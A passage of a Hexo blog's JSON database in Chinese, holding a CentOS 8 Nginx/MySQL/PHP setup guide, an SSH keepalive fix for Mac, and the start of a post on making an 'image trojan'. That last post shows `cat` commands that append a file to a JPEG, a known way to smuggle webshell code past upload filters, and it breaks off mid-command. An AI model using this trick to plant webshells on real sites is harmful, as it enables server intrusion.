class=\"number\">86</span>_<span class=\"number\">64</span>.rpm</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看 Nginx 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">nginx -v</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看 Nginx 配置文件路径</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat <span class=\"regexp\">/etc/</span>nginx/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>include 配置项的 /etc/nginx/conf.d/*.conf 即为 Nginx 配置文件的默认路径</p>\n<ol start=\"4\">\n<li>在配置文件默认路径下进行备份</li>\n</ol>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span> /etc/nginx/<span class=\"keyword\">conf</span>.d</span><br><span class=\"line\"><span class=\"keyword\">cp</span> default.<span class=\"keyword\">conf</span> *.<span class=\"keyword\">conf</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>打开 *.conf 文件</li>\n</ol>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">vim</span> <span class=\"regexp\">*.conf</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>编辑 default.conf 文件</li>\n</ol>\n<ul>\n<li><p>在 location 的 index 项中添加 index.php</p>\n</li>\n<li><p>删除 location ~ .php$ 大括号前的 #，并修改以下配置项：</p>\n</li>\n<li><ul>\n<li>修改 root 项为网站根目录，即 location 中的 root 项，本文以 /usr/share/nginx/html; 为例</li>\n<li>修改 fastcgi_pass 项为 unix:/run/php-fpm/<a href=\"http://www.sock/\">www.sock</a>;</li>\n<li>将 fastcgi_param SCRIPT_FILENAME 后的 /scripts$fastcgi_script_name; 替换为 $document_root$fastcgi_script_name;</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">    root          <span class=\"regexp\">/usr/</span>share<span class=\"regexp\">/nginx/</span>html;</span><br><span class=\"line\">    fastcgi_pass  unix:<span class=\"regexp\">/run/</span>php-fpm/www.sock;</span><br><span class=\"line\">    fastcgi_index index.php;</span><br><span class=\"line\">    fastcgi_param SCRIPT_FILENAME <span class=\"variable\">$document_root</span><span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">    include       fastcgi_params;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>启动Nginx并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> nginx</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> nginx</span><br><span class=\"line\">systemctl status nginx</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装和配置MySQL\"><a href=\"#安装和配置MySQL\" class=\"headerlink\" title=\"安装和配置MySQL\"></a>安装和配置MySQL</h2><ol>\n<li>安装 MySQL</li>\n</ol>\n<figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install <span class=\"meta\">@mysql</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看 MySQL 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">mysql -V</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>启动 MySQL 并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> mysqld</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> mysqld</span><br><span class=\"line\">systemctl status mysqld</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>执行 MySQL 安全性操作并设置密码</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">mysql_secure_installation</span></span><br></pre></td></tr></table></figure>\n\n<p>按照以下步骤，执行对应操作：</p>\n<ul>\n<li><p>输入 y 并按 <strong>Enter</strong> 开始相关配置。</p>\n</li>\n<li><p>选择密码验证策略强度，建议选择高强度的密码验证策略。输入 2 并按 <strong>Enter</strong>。</p>\n</li>\n<li><ul>\n<li>0：表示低。</li>\n<li>1：表示中。</li>\n<li>2：表示高。</li>\n</ul>\n</li>\n<li><p>设置 MySQL 密码并按 <strong>Enter</strong> ，输入密码默认不显示。</p>\n</li>\n<li><p>再次输入密码并按 <strong>Enter</strong>，输入 y 确认设置该密码。</p>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，移除匿名用户。</p>\n</li>\n<li><p>设置是否禁止远程连接 MySQL：</p>\n</li>\n<li><ul>\n<li>禁止远程连接：输入 y 并按 <strong>Enter</strong>。</li>\n<li>允许远程连接：输入 n 并按 <strong>Enter</strong>。</li>\n</ul>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，删除 test 库及对 test 库的访问权限。</p>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，重新加载授权表。</p>\n</li>\n</ul>\n<h2 id=\"安装和配置PHP\"><a href=\"#安装和配置PHP\" class=\"headerlink\" title=\"安装和配置PHP\"></a>安装和配置PHP</h2><ol>\n<li>添加并更新 epel 源</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install epel-<span class=\"keyword\">release</span></span><br><span class=\"line\">dnf <span class=\"keyword\">update</span> epel-<span class=\"keyword\">release</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>删除缓存的无用软件包并更新软件源</li>\n</ol>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf clean <span class=\"keyword\">all</span></span><br><span class=\"line\">dnf makecache</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 remi 源</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install https:<span class=\"regexp\">//</span>rpms.remirepo.net<span class=\"regexp\">/enterprise/</span>remi-release-<span class=\"number\">8</span>.rpm</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>启动 PHP 7.4 模块</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dnf</span> module install php:remi-<span class=\"number\">7</span>.<span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>安装所需 PHP 对应模块</li>\n</ol>\n<figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf install php php-curl php-dom php-exif php-file<span class=\"literal\">inf</span>o php-fpm php-gd php-hash php-json php-mbstring php-mysqli php-openssl php-pcre php-<span class=\"keyword\">xml</span> <span class=\"title\">libsodium</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>查看 PHP 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">php -v</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>打开 <a href=\"http://www.conf/\">www.conf</a> 文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi <span class=\"regexp\">/etc/</span>php-fpm.d/www.conf</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>将 user = apache 及 group = apache 修改为 user = nginx 及 group = nginx</li>\n<li>启动 PHP-FPM 并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> php-fpm</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> php-fpm</span><br><span class=\"line\">systemctl status php-fpm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"验证环境配置\"><a href=\"#验证环境配置\" class=\"headerlink\" title=\"验证环境配置\"></a>验证环境配置</h2><p>/usr/share/nginx/html 为 Nginx 中已配置的网站根目录</p>\n<ol>\n<li>创建测试文件</li>\n</ol>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"xml\">echo &quot;</span><span class=\"php\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><span class=\"xml\">&quot; &gt;&gt; /usr/share/nginx/html/index.php</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>在本地浏览器中访问服务器公网IP，查看环境配置是否成功</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>云服务器实例的公网 IP/index.php</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安装和配置-Nginx\"><a href=\"#安装和配置-Nginx\" class=\"headerlink\" title=\"安装和配置 Nginx\"></a>安装和配置 Nginx</h2><ol>\n<li>安装 Nginx</li>\n</ol>\n<p>以安装 Nginx 1.18.0 为例，可通过 <a href=\"http://nginx.org/packages/centos/8/x86_64/RPMS/?spm=a2c4g.11186623.2.31.557423bfYPMd6u\">Ngingx 官方安装包</a> 获取适用于 CentOS 8的更多版本。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dnf</span> -y install http://nginx.org/packages/centos/<span class=\"number\">8</span>/x<span class=\"number\">86</span>_<span class=\"number\">64</span>/RPMS/nginx-<span class=\"number\">1</span>.<span class=\"number\">18</span>.<span class=\"number\">0</span>-<span class=\"number\">1</span>.el<span class=\"number\">8</span>.ngx.x<span class=\"number\">86</span>_<span class=\"number\">64</span>.rpm</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看 Nginx 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">nginx -v</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看 Nginx 配置文件路径</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat <span class=\"regexp\">/etc/</span>nginx/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>include 配置项的 /etc/nginx/conf.d/*.conf 即为 Nginx 配置文件的默认路径</p>\n<ol start=\"4\">\n<li>在配置文件默认路径下进行备份</li>\n</ol>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span> /etc/nginx/<span class=\"keyword\">conf</span>.d</span><br><span class=\"line\"><span class=\"keyword\">cp</span> default.<span class=\"keyword\">conf</span> *.<span class=\"keyword\">conf</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>打开 *.conf 文件</li>\n</ol>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">vim</span> <span class=\"regexp\">*.conf</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>编辑 default.conf 文件</li>\n</ol>\n<ul>\n<li><p>在 location 的 index 项中添加 index.php</p>\n</li>\n<li><p>删除 location ~ .php$ 大括号前的 #，并修改以下配置项：</p>\n</li>\n<li><ul>\n<li>修改 root 项为网站根目录，即 location 中的 root 项，本文以 /usr/share/nginx/html; 为例</li>\n<li>修改 fastcgi_pass 项为 unix:/run/php-fpm/<a href=\"http://www.sock/\">www.sock</a>;</li>\n<li>将 fastcgi_param SCRIPT_FILENAME 后的 /scripts$fastcgi_script_name; 替换为 $document_root$fastcgi_script_name;</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">    root          <span class=\"regexp\">/usr/</span>share<span class=\"regexp\">/nginx/</span>html;</span><br><span class=\"line\">    fastcgi_pass  unix:<span class=\"regexp\">/run/</span>php-fpm/www.sock;</span><br><span class=\"line\">    fastcgi_index index.php;</span><br><span class=\"line\">    fastcgi_param SCRIPT_FILENAME <span class=\"variable\">$document_root</span><span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">    include       fastcgi_params;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>启动Nginx并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> nginx</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> nginx</span><br><span class=\"line\">systemctl status nginx</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装和配置MySQL\"><a href=\"#安装和配置MySQL\" class=\"headerlink\" title=\"安装和配置MySQL\"></a>安装和配置MySQL</h2><ol>\n<li>安装 MySQL</li>\n</ol>\n<figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install <span class=\"meta\">@mysql</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看 MySQL 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">mysql -V</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>启动 MySQL 并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> mysqld</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> mysqld</span><br><span class=\"line\">systemctl status mysqld</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>执行 MySQL 安全性操作并设置密码</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">mysql_secure_installation</span></span><br></pre></td></tr></table></figure>\n\n<p>按照以下步骤，执行对应操作：</p>\n<ul>\n<li><p>输入 y 并按 <strong>Enter</strong> 开始相关配置。</p>\n</li>\n<li><p>选择密码验证策略强度，建议选择高强度的密码验证策略。输入 2 并按 <strong>Enter</strong>。</p>\n</li>\n<li><ul>\n<li>0：表示低。</li>\n<li>1：表示中。</li>\n<li>2：表示高。</li>\n</ul>\n</li>\n<li><p>设置 MySQL 密码并按 <strong>Enter</strong> ，输入密码默认不显示。</p>\n</li>\n<li><p>再次输入密码并按 <strong>Enter</strong>，输入 y 确认设置该密码。</p>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，移除匿名用户。</p>\n</li>\n<li><p>设置是否禁止远程连接 MySQL：</p>\n</li>\n<li><ul>\n<li>禁止远程连接：输入 y 并按 <strong>Enter</strong>。</li>\n<li>允许远程连接：输入 n 并按 <strong>Enter</strong>。</li>\n</ul>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，删除 test 库及对 test 库的访问权限。</p>\n</li>\n<li><p>输入 y 并按 <strong>Enter</strong>，重新加载授权表。</p>\n</li>\n</ul>\n<h2 id=\"安装和配置PHP\"><a href=\"#安装和配置PHP\" class=\"headerlink\" title=\"安装和配置PHP\"></a>安装和配置PHP</h2><ol>\n<li>添加并更新 epel 源</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install epel-<span class=\"keyword\">release</span></span><br><span class=\"line\">dnf <span class=\"keyword\">update</span> epel-<span class=\"keyword\">release</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>删除缓存的无用软件包并更新软件源</li>\n</ol>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf clean <span class=\"keyword\">all</span></span><br><span class=\"line\">dnf makecache</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>安装 remi 源</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf -y install https:<span class=\"regexp\">//</span>rpms.remirepo.net<span class=\"regexp\">/enterprise/</span>remi-release-<span class=\"number\">8</span>.rpm</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>启动 PHP 7.4 模块</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">dnf</span> module install php:remi-<span class=\"number\">7</span>.<span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>安装所需 PHP 对应模块</li>\n</ol>\n<figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf install php php-curl php-dom php-exif php-file<span class=\"literal\">inf</span>o php-fpm php-gd php-hash php-json php-mbstring php-mysqli php-openssl php-pcre php-<span class=\"keyword\">xml</span> <span class=\"title\">libsodium</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>查看 PHP 版本</li>\n</ol>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">php -v</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>打开 <a href=\"http://www.conf/\">www.conf</a> 文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi <span class=\"regexp\">/etc/</span>php-fpm.d/www.conf</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>将 user = apache 及 group = apache 修改为 user = nginx 及 group = nginx</li>\n<li>启动 PHP-FPM 并设置为开机自启动并查看状态</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"keyword\">start</span> php-fpm</span><br><span class=\"line\">systemctl <span class=\"keyword\">enable</span> php-fpm</span><br><span class=\"line\">systemctl status php-fpm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"验证环境配置\"><a href=\"#验证环境配置\" class=\"headerlink\" title=\"验证环境配置\"></a>验证环境配置</h2><p>/usr/share/nginx/html 为 Nginx 中已配置的网站根目录</p>\n<ol>\n<li>创建测试文件</li>\n</ol>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"xml\">echo &quot;</span><span class=\"php\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><span class=\"xml\">&quot; &gt;&gt; /usr/share/nginx/html/index.php</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>在本地浏览器中访问服务器公网IP，查看环境配置是否成功</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>云服务器实例的公网 IP/index.php</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Mac下SSH闲时自动中断解决方法","toc":false,"date":"2021-03-24T07:25:56.000Z","description":"Mac下SSH闲时自动中断解决方法","_content":"\n使用Mac自带的终端SSH连接服务器的时候，只要隔一小段时间不操作的话连接就会自动中断.\n\n解决方法：\n\n1. 连接到服务器\n2. 编辑服务端配置文件\n\n```\nvim /etc/ssh/sshd_config\n```\n\n3. 在最下面添加两行配置代码\n\n```\nClientAliveInterval 30\nClientAliveCountMax 3\n```\n\n4. 编辑客户端配置文件\n\n```\nvim /etc/ssh/ssh_config\n```\n\n5. 在Host * 下面添加两行配置代码\n\n```\nServerAliveInterval 30\nServerAliveCountMax 3\n```\n\n6. 同步数据然后重启\n\n```\nsync\t\t// 将数据由内存同步到硬盘\nreboot\t\t// 重启\n```\n\n\n\n","source":"_posts/Mac下SSH闲时自动中断解决方法.md","raw":"---\ntitle: Mac下SSH闲时自动中断解决方法\ntoc: false\ndate: 2021-03-24 15:25:56\ndescription: Mac下SSH闲时自动中断解决方法\ntags: Mac\ncategories: Mac\n---\n\n使用Mac自带的终端SSH连接服务器的时候，只要隔一小段时间不操作的话连接就会自动中断.\n\n解决方法：\n\n1. 连接到服务器\n2. 编辑服务端配置文件\n\n```\nvim /etc/ssh/sshd_config\n```\n\n3. 在最下面添加两行配置代码\n\n```\nClientAliveInterval 30\nClientAliveCountMax 3\n```\n\n4. 编辑客户端配置文件\n\n```\nvim /etc/ssh/ssh_config\n```\n\n5. 在Host * 下面添加两行配置代码\n\n```\nServerAliveInterval 30\nServerAliveCountMax 3\n```\n\n6. 同步数据然后重启\n\n```\nsync\t\t// 将数据由内存同步到硬盘\nreboot\t\t// 重启\n```\n\n\n\n","slug":"Mac下SSH闲时自动中断解决方法","published":1,"updated":"2021-05-18T07:07:37.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nm000gicswahfvfjuc","content":"<p>使用Mac自带的终端SSH连接服务器的时候，只要隔一小段时间不操作的话连接就会自动中断.</p>\n<p>解决方法：</p>\n<ol>\n<li>连接到服务器</li>\n<li>编辑服务端配置文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/etc/</span>ssh/sshd_config</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>在最下面添加两行配置代码</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ClientAliveInterval</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attribute\">ClientAliveCountMax</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>编辑客户端配置文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/etc/</span>ssh/ssh_config</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>在Host * 下面添加两行配置代码</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ServerAliveInterval</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attribute\">ServerAliveCountMax</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>同步数据然后重启</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sync\t\t<span class=\"regexp\">//</span> 将数据由内存同步到硬盘</span><br><span class=\"line\">reboot\t\t<span class=\"regexp\">//</span> 重启</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>使用Mac自带的终端SSH连接服务器的时候，只要隔一小段时间不操作的话连接就会自动中断.</p>\n<p>解决方法：</p>\n<ol>\n<li>连接到服务器</li>\n<li>编辑服务端配置文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/etc/</span>ssh/sshd_config</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>在最下面添加两行配置代码</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ClientAliveInterval</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attribute\">ClientAliveCountMax</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>编辑客户端配置文件</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/etc/</span>ssh/ssh_config</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>在Host * 下面添加两行配置代码</li>\n</ol>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">ServerAliveInterval</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attribute\">ServerAliveCountMax</span> <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>同步数据然后重启</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sync\t\t<span class=\"regexp\">//</span> 将数据由内存同步到硬盘</span><br><span class=\"line\">reboot\t\t<span class=\"regexp\">//</span> 重启</span><br></pre></td></tr></table></figure>\n\n\n\n"},{"title":"Mac下制作图片马","toc":false,"date":"2021-03-24T07:55:14.000Z","description":"Mac下制作图片马","_content":"\n## 0x01 将file1.txt追加到file2.jpg后面：\n\n```\ncat file1.txt >> file2.jpg\n```\n\n## 0x02 将两个文件合并成第三个文件：\n\n```\ncat file1.txt file2.jpg >> file3.jpg\n```\n\n","source":"_posts/Mac下制作图片马.md","raw":"---\ntitle: Mac下制作图片马\ntoc: false\ndate: 2021-03-24 15:55:14\ndescription: Mac下制作图片马\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 将file1.txt追加到file2.jpg后面：\n\n```\ncat file1.txt >> file2.jpg\n```\n\n## 0x02 将两个文件合并成第三个文件：\n\n```\ncat file1.txt file2.jpg >> 